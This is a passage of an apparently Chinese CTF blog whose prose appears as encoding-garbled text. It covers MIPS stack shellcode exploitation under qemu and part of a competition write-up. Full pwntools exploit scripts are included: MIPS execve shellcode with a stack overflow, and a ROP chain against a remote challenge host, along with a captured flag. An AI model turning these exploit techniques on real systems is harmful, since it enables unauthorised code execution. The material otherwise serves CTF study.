      <p>ç”±äºqemuå’Œå¼€å¯PIEçš„mipsæ¶æ„çš„ç‰¹æ€§ï¼Œè²Œä¼¼åœ¨æ ˆä¸‹é¢å°±æ˜¯å…±äº«åº“çš„åŠ è½½åœ°å€ï¼Œè¿™ä¸ªåšäº†å¥½å¤šå®éªŒï¼Œéƒ½æ˜¯è¿™æ ·çš„ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œåº”è¯¥æ˜¯mipsæ¶æ„ä¸‹å¼€å¯PIEä¹‹åï¼Œæ–‡ä»¶ä¼šå˜æˆå…±äº«åº“çš„æ ¼å¼ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215721.png" alt="image-20211115215721252"></p>
<p>å†ä¾æ®å…±äº«åº“åŠ è½½çš„ç‰¹æ€§å§ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç›´æ¥å°±èƒ½é€šè¿‡<code>add-symbol-file File text_addr</code>çš„å½¢å¼æ¥ç¡®å®šåœ°å€ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215611.png" alt="image-20211115215604777"></p>
<p>è¿™é‡Œçº¢ç®­å¤´æŒ‡å‘çš„åœ°æ–¹åº”è¯¥å°±æ˜¯æˆ‘ä»¬çš„å¼€å¯PIEä¹‹åçš„æ–‡ä»¶åŠ è½½åœ°å€ï¼Œä¹‹åæ·»åŠ å³å¯ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215846.png" alt="image-20211115215845957"></p>
<p>è¿™æ ·åœ¨è¾“å…¥å‡½æ•°æ‰“å°ï¼Œå³å¯ç¡®å®š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215959.png" alt="image-20211115215959158"></p>
<p>å¾—åˆ°å¦‚ä¸‹ç»“æœï¼Œè¿™æ ·å°±èƒ½æ–¹ä¾¿è°ƒè¯•äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115220009.png" alt="image-20211115220009365"></p>
<p>æ‰€ä»¥è¿™é‡Œåº”è¯¥æ˜¯æœ‰ä¸¤ç§æ–¹æ³•çš„</p>

        <h2 id="1-é€šè¿‡çˆ†ç ´æ ˆè¿›è¡Œshellcodeåˆ©ç”¨"   >
          <a href="#1-é€šè¿‡çˆ†ç ´æ ˆè¿›è¡Œshellcodeåˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-é€šè¿‡çˆ†ç ´æ ˆè¿›è¡Œshellcodeåˆ©ç”¨" class="headerlink" title="1.é€šè¿‡çˆ†ç ´æ ˆè¿›è¡Œshellcodeåˆ©ç”¨"></a>1.é€šè¿‡çˆ†ç ´æ ˆè¿›è¡Œshellcodeåˆ©ç”¨</h2>
      
        <h3 id="1-ç¼–å†™shellcode"   >
          <a href="#1-ç¼–å†™shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç¼–å†™shellcode" class="headerlink" title="(1)ç¼–å†™shellcode"></a>(1)ç¼–å†™shellcode</h3>
      <p>è¿™é‡Œè®²ä¸€ä¸‹shellcodeçš„ç¼–å†™</p>

        <h4 id="â‘ é€šè¿‡æ ˆå¯„å­˜å™¨spæ¥å–å€¼ç¼–å†™"   >
          <a href="#â‘ é€šè¿‡æ ˆå¯„å­˜å™¨spæ¥å–å€¼ç¼–å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ é€šè¿‡æ ˆå¯„å­˜å™¨spæ¥å–å€¼ç¼–å†™" class="headerlink" title="â‘ é€šè¿‡æ ˆå¯„å­˜å™¨spæ¥å–å€¼ç¼–å†™"></a>â‘ é€šè¿‡æ ˆå¯„å­˜å™¨spæ¥å–å€¼ç¼–å†™</h4>
      <p>åˆ©ç”¨lwæŒ‡ä»¤ï¼Œé€šè¿‡spå¯„å­˜å™¨æ¥ä»æ ˆä¸Šå–å€¼èµ‹ç»™å¯¹åº”çš„å‚æ•°å¯„å­˜å™¨ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115233439.png" alt="image-20211115233439670"></p>
<p>å¯¹åº”çš„æ±‡ç¼–ç”Ÿæˆï¼š</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw a0,-0x1e4(sp)&quot;</span> 	<span class="comment">#a</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a1,s2&quot;</span>			<span class="comment">#a1</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a2,s2&quot;</span>			<span class="comment">#a2</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw v0,-0x1d8(sp)&quot;</span>	<span class="comment">#v0</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;syscall&quot;</span>			<span class="comment">#syscall</span></span><br></pre></td></tr></table></div></figure>

<p>ç”±äº\x00çš„æˆªæ–­ï¼Œæ‰€ä»¥è¿™é‡Œé€‰å–åœ¨spä¹‹å‰çš„æ•°æ®è¿›è¡Œè·å–ï¼Œå…¶å®ç”±äºå¾ªç¯çš„å…³ç³»ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡é‡å¤å‘é€æ•°æ®æ¥å°†\x00ç»™è¾“å…¥è¿›æ¥ï¼Œä¹‹åå‘é€/bin/sh\x00ä»¥åŠsyscallçš„æ—¶å€™å°±æ˜¯ç”¨åˆ°è¿™ä¸ªçš„ã€‚</p>

        <h4 id="â‘¡åˆ©ç”¨å…¶ä»–å¯„å­˜å™¨"   >
          <a href="#â‘¡åˆ©ç”¨å…¶ä»–å¯„å­˜å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åˆ©ç”¨å…¶ä»–å¯„å­˜å™¨" class="headerlink" title="â‘¡åˆ©ç”¨å…¶ä»–å¯„å­˜å™¨"></a>â‘¡åˆ©ç”¨å…¶ä»–å¯„å­˜å™¨</h4>
      <p>åŒç†ï¼Œç”±äºelf_baseä¸å˜ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¯„å­˜å™¨å‡å»åç§»è·å–å­˜åœ¨bssæ®µä¸Šçš„æ•°æ®ï¼Œä¸€æ ·è®¾ç½®ï¼Œæ¯”å¦‚ä¸‹å›¾çš„a1å’Œs1å¯„å­˜å™¨ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115234634.png" alt="image-20211115234634536"></p>
<p>å¦‚ä¸‹çš„exp</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;arm&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./mipselNormal&quot;</span></span><br><span class="line">localPort = <span class="string">&quot;12345&quot;</span></span><br><span class="line">version = <span class="string">&quot;2.23&quot;</span></span><br><span class="line">arch = <span class="string">&quot;mipsel&quot;</span></span><br><span class="line">qemu_arch = <span class="string">&quot;qemu-&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(arch)</span><br><span class="line">linkLibrary = <span class="string">&quot;/home/hacker/glibc/&#123;0&#125;/&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(version,arch)</span><br><span class="line">libc = ELF(linkLibrary+<span class="string">&quot;/lib/libc-&#123;0&#125;.so&quot;</span>.<span class="built_in">format</span>(version))</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.31.so&quot;)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xff&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remote_debug=<span class="number">1</span></span><br><span class="line">remoteFlag=<span class="number">0</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> remote_debug==<span class="number">1</span>:</span><br><span class="line">    p = process([arch, <span class="string">&#x27;-L&#x27;</span>, linkLibrary, <span class="string">&#x27;-g&#x27;</span>, localPort, binary])</span><br><span class="line">    <span class="comment">#p = process([arch,&#x27;-g&#x27;,localPort,binary])</span></span><br><span class="line">    <span class="comment">#p = process([arch, &#x27;-L&#x27;, &#x27;.&#x27;, &#x27;-g&#x27;, localPort, binary])</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"><span class="keyword">elif</span> local==<span class="number">1</span>:</span><br><span class="line">    p = process([arch, <span class="string">&#x27;-L&#x27;</span>, linkLibrary, binary])</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"><span class="keyword">elif</span> remoteFlag==<span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;172.35.30.12&quot;</span>,<span class="string">&quot;9999&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mulArchDbg</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;gnome-terminal -- bash -c \&quot;gdb-multiarch -q &#123;0&#125; \</span></span><br><span class="line"><span class="string">        --eval-command=&#x27;target remote localhost:&#123;1&#125;&#x27;\&quot;&quot;</span>.<span class="built_in">format</span>(binary,localPort))</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_package</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input package:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line"></span><br><span class="line">    elf_base = <span class="number">0x7ffed000</span></span><br><span class="line">    sp = elf_base - <span class="number">0x1160</span></span><br><span class="line">    <span class="comment">#sp = 0x7ffebea0</span></span><br><span class="line">    <span class="comment">#mulArchDbg()</span></span><br><span class="line">    binsh_addr = sp-<span class="number">0x200</span>+<span class="number">0x8</span> + <span class="number">20</span> + <span class="number">0x4</span></span><br><span class="line">    shellcode_addr = sp-<span class="number">0x200</span>+<span class="number">0x8</span></span><br><span class="line">    binsh0 = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    binsh1 = <span class="string">&#x27;/bin/sh\x11&#x27;</span></span><br><span class="line">    lg(<span class="string">&quot;sp&quot;</span>,sp)</span><br><span class="line">    lg(<span class="string">&quot;binsh_addr&quot;</span>,binsh_addr)</span><br><span class="line">    lg(<span class="string">&quot;shellcode_addr&quot;</span>,shellcode_addr)</span><br><span class="line">    data0_1 = <span class="string">&#x27;\xab\x0f\xaa&#x27;</span></span><br><span class="line">    data0_2 = <span class="string">&#x27;\xab\x0f&#x27;</span></span><br><span class="line">    data1 = <span class="string">&#x27;\xab\x0f&#x27;</span>.ljust(<span class="number">4</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    data_addr = binsh_addr + <span class="number">0x8</span></span><br><span class="line">    lg(<span class="string">&quot;data_addr&quot;</span>,data_addr)</span><br><span class="line">    <span class="comment">#path(v0),argv(a1),env(a2),unistd_execv(v0)</span></span><br><span class="line">    shellcode1 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x0c\x01\x01\x01&quot;</span></span><br><span class="line">    shellcode0_1 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x0c\x11\x11\x00&quot;</span></span><br><span class="line">    shellcode0_2 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x0c\x11\x00\x00&quot;</span></span><br><span class="line">    shellcode0_3 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;\x0c\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">    <span class="comment">#path(a0)</span></span><br><span class="line">    <span class="comment">#p.sendline(&quot;EXIT&quot;)</span></span><br><span class="line">    p.sendline((<span class="string">&quot;A&quot;</span>*<span class="number">8</span> + shellcode1 + p32(binsh_addr) + binsh1 + data1).ljust(<span class="number">0x1f8</span>+<span class="number">4</span>,<span class="string">&quot;C&quot;</span>) + p32(shellcode_addr))</span><br><span class="line">    p.sendline((<span class="string">&quot;A&quot;</span>*<span class="number">8</span> + shellcode1 + p32(binsh_addr) + binsh1 + data0_1))</span><br><span class="line">    p.sendline((<span class="string">&quot;A&quot;</span>*<span class="number">8</span> + shellcode1 + p32(binsh_addr) + binsh1 + data0_2))</span><br><span class="line">    p.sendline((<span class="string">&quot;A&quot;</span>*<span class="number">8</span> + shellcode1 + p32(binsh_addr) + binsh0 + data0_2))</span><br><span class="line">    p.sendline((<span class="string">&quot;A&quot;</span>*<span class="number">8</span> + shellcode0_1))</span><br><span class="line">    p.sendline((<span class="string">&quot;A&quot;</span>*<span class="number">8</span> + shellcode0_2))</span><br><span class="line">    p.sendline((<span class="string">&quot;A&quot;</span>*<span class="number">8</span> + shellcode0_3))</span><br><span class="line">    p.sendline(<span class="string">&quot;EXIT&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></div></figure>

<p>ç„¶ååŠ ä¸ªçˆ†ç ´è„šæœ¬å³å¯ï¼Œçˆ†ç ´elf_baseçš„åœ°å€ï¼Œè¿™é‡Œçš„spæ˜¯é€šè¿‡mainå‡½æ•°è¿”å›ä¹‹åè¿›å…¥shellcodeçš„spçš„åœ°å€ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115224101.png" alt="image-20211115224101569"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/">å¼ºç½‘æ‹Ÿæ€WP</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-10-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-10-26</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>æ€»çš„æ¥è¯´è¿™æ¬¡å¼ºç½‘æ‹Ÿæ€çš„PWNé¢˜éƒ½ä¸ç®—éš¾ï¼Œä¸è¿‡æœ‰å‡ ä¸ªç‚¹å€’æ˜¯æŒºæœ‰æ„æ€çš„ã€‚</p>

        <h1 id="ä¸€ã€sonic"   >
          <a href="#ä¸€ã€sonic" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€sonic" class="headerlink" title="ä¸€ã€sonic"></a>ä¸€ã€sonic</h1>
      <p>æ³„éœ²elf_baseäº†ï¼Œç„¶åç›´æ¥æ ˆæº¢å‡ºï¼Œåˆ©ç”¨æœ¬èº«è‡ªå¸¦çš„gadgetå³å¯getshellã€‚ä½†æ˜¯è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œä¹‹åæ‰å‘ç°çš„ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚<code>/usr/bin/cli</code>è¿™ä¸ªå‘½ä»¤å±…ç„¶ç›´æ¥å¾—åˆ°flagã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#context</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">SigreturnFrame(kernel = &#x27;amd64&#x27;)</span><br><span class="line"></span><br><span class="line">binary = &quot;./sonic&quot;</span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line">#elf = ELF(binary)</span><br><span class="line">context.timeout = 0.2</span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">    p = process(context.binary)</span><br><span class="line">    #p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span><br><span class="line">    elf = ELF(context.binary)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;123.60.63.90&quot;,6890)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = lambda s:p.send(s)</span><br><span class="line">sl = lambda s:p.sendline(s)</span><br><span class="line">rc = lambda s:p.recv(s)</span><br><span class="line">ru = lambda s:p.recvuntil(s)</span><br><span class="line">rl = lambda :p.recvline()</span><br><span class="line">sa = lambda a,s:p.sendafter(a,s)</span><br><span class="line">sla = lambda a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &#x27;\0&#x27;))</span><br><span class="line">u64Leakbase = lambda offset :u64(ru(&quot;\x7f&quot;)[-6: ] + &#x27;\0\0&#x27;) - offset</span><br><span class="line">u32Leakbase = lambda offset :u32(ru(&quot;\xf7&quot;)[-4: ]) - offset</span><br><span class="line">it      = lambda                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = &quot;your choice&gt;&gt;&quot;</span><br><span class="line"></span><br><span class="line">def dockerDbg():</span><br><span class="line">	myGdb = remote(&quot;127.0.0.1&quot;,30001)</span><br><span class="line">    myGdb.interactive()</span><br><span class="line">    myGdb.sendline(&#x27;b *$rebase(0xdbd)&#x27;)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line">#b *$rebase(0xdbd)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line">def gdb_b(addr):</span><br><span class="line">    gdb.attach(p, &quot;b *$rebase(&#123;0&#125;) \n c&quot;.format(addr))</span><br><span class="line">    sleep(0.5)</span><br><span class="line"></span><br><span class="line">def lg(string,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(&quot;main Address=0x&quot;)</span><br><span class="line">elf_base = int(rc(12),16) -0x7cf</span><br><span class="line">backdoor = elf_base+0x73A</span><br><span class="line">lg(&quot;elf_base&quot;,elf_base)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x00000000000008c3</span><br><span class="line">pop_rsi_r15_ret = 0x00000000000008c1</span><br><span class="line">usrname = 0x201040</span><br><span class="line">execv = 0x610</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &#x27;/bin/sh\x00&#x27;.ljust(0x28,&#x27;A&#x27;)</span><br><span class="line">payload += p64(elf_base + pop_rdi_ret)</span><br><span class="line">payload += p64(elf_base + usrname)</span><br><span class="line">payload += p64(elf_base + pop_rsi_r15_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(elf_base + execv)</span><br><span class="line"></span><br><span class="line">#dbg()</span><br><span class="line">sl(payload)</span><br><span class="line">#pause()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#flag&#123;riCGJnvUieCXasPUUiAQ6XzWVdjFJTQB&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå¯ä»¥æ³¨æ„ä¸‹execvè¿™ä¸ªå‡½æ•°ï¼Œè®¾ç½®äº†rdiä¸º<code>/bin/sh</code>ä¹‹åè¿˜éœ€è¦è®¾ç½®rsiä¸º0æ‰å¯getshellã€‚</p>

        <h1 id="äºŒã€bitflip"   >
          <a href="#äºŒã€bitflip" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€bitflip" class="headerlink" title="äºŒã€bitflip"></a>äºŒã€bitflip</h1>
      <p>è¿™ä¹Ÿæ˜¯å¾ˆå¸¸è§„ï¼Œ2.27çš„off by oneï¼Œåªèƒ½æœ€å¤§0x60çš„Chunkï¼Œå¯ä»¥ç›´æ¥æ”¹sizeå¤§äº0x80çš„fastbinï¼Œå¡«æ»¡tcacheä¹‹åé‡Šæ”¾è¿›å…¥Unsortedbinæ³„éœ²åœ°å€ï¼Œä¹‹åå°±å¸¸è§„æ”¹free_hookäº†ã€‚</p>
